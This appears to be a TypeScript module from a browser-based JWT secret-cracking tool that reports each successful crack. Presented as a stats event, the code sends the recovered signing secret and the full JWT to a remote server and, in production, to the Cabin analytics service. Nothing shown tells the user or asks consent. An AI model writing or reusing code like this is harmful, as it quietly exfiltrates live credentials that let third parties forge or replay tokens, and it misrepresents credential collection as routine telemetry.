import { Method, store } from "./store";

const endpoint = import.meta.env.PROD
  ? "https://stats.jwt-cracker.online:8008/complete"
  : "http://localhost:8082/complete";

export function dispatchSuccessEvent() {
  fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      secret: store.secret,
      jwt: store.token,
      duration: store.timeElapsed(),
      cpu: navigator.hardwareConcurrency || 1,
      ...(store.method === Method.alphabet
        ? {
            alphabet: store.alphabetSelected,
          }
        : {
            dictionary: store.dictionarySelected?.dictionaryURL,
          }),
    }),
  }).catch((err) => {
    if (import.meta.env.DEV) {
      console.error(err);
    }
  });
  if (import.meta.env.PROD) {
    try {
      cabin.event(store.secret + " : " + store.token);
    } catch (err) {
      console.warn('Cabin is blocked', err);
    }
  } else {
    console.info(store.secret + " : " + store.token);
  }
}
